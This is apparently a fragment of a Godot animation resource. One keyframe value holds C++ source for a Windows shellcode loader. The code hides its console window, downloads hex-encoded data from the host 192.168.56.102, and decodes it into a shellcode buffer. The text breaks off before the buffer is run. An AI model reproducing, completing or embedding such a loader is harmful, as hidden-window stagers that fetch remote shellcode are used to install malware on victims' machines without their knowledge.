tracks/2/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 1,
"values": ["#include <iostream>
#include <cpr/cpr.h>
#include <windows.h>

int main() {
	 ::ShowWindow(::GetConsoleWindow(), SW_HIDE);
	cpr::Response r = cpr::Get(cpr::Url{ \"http://192.168.56.102/home\" });
	char* memBuffer = NULL;
	memBuffer = (char *)r.text.c_str(); 
	
	unsigned char shellcode[382]; 
	memBuffer += 2; 
	for (size_t count = 0; count < sizeof shellcode - 1; count++) { 
		sscanf_s(memBuffer, \"%02hhx\", &shellcode[count]); 
		memBuffer = memBuffer + 4;
	}"]
}
